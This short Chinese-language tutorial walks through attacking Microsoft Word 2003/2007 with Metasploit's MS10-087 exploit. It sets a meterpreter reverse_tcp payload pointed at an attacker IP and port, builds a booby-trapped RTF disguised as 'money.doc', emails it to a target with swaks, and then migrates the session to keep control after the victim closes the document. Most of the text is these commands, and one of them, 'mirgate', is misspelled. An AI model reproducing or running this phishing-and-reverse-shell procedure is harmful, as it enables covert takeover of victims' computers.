## 使用msf进行攻击(使用漏洞MS10-087)
    msf是一个专业的支持大多数漏洞攻击的工具

    攻击目标为word2003主流版本和2007的部分版本
    msfconsole进入控制台
    查找ms10-087
    set PAYLOAD windows/meterpreter/reverse_tcp  //设定攻击载荷为反弹TCP连接会话
    set LHOST 192.168.250.162  //设置反弹连接目标IP
    set LPORT 8080                          //设置反弹连接目标端口号
    set FILENAME money.rtf     //创建的word文档名称为money.rtf，格式必须是rtf，一会儿我们再把它改名为.doc也是可以正常执行的。
    exploit //生成带攻击代码的word文档

    swaks  --to  example@example.com --from xxx@xxx.com  --ehlo freebuf.com --body hello --header "Subject: download" --attach  money.doc



    对方打开word文件，根据反弹的meterpreter就可以在控制台控制对方电脑了
    但是在这时关闭文档连接就断了，这里可以用
    ps 查找运行的程序
    mirgate [pid]
